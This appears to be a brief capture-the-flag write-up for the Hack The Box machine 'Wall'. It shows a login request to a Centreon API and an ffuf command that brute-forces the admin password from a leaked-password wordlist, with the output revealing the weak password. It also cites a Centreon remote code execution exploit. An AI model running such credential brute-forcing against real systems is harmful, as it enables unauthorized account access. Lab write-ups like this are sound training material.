## Wall machine on HTB
### URL: https://app.hackthebox.com/machines/208
### Difficulty: Medium

## Solution:
### Usage of weak login credentials at http://10.10.10.157/centreon/api/index.php?action=authenticate
**Example Request:**
```
POST /centreon/api/index.php?action=authenticate HTTP/1.1
Host: 10.10.10.157
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

username=admin&password=FUZZ
```
**Fuzzing the login creds:**
```
soliman@Legion:~/wordlists$ ffuf --request req  -request-proto http -w darkweb2017_top-1000.txt -fc 403

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.10.157/centreon/api/index.php?action=authenticate
 :: Wordlist         : FUZZ: /home/soliman/wordlists/darkweb2017_top-1000.txt
 :: Header           : Host: 10.10.10.157
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=admin&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

password1               [Status: 200, Size: 61, Words: 1, Lines: 1, Duration: 1015ms]
:: Progress: [999/999] :: Job [1/1] :: 346 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
soliman@Legion:~/wordlists$
```


### References: 
#### Centreon 19.04 - Remote Code Execution: https://www.exploit-db.com/exploits/47069
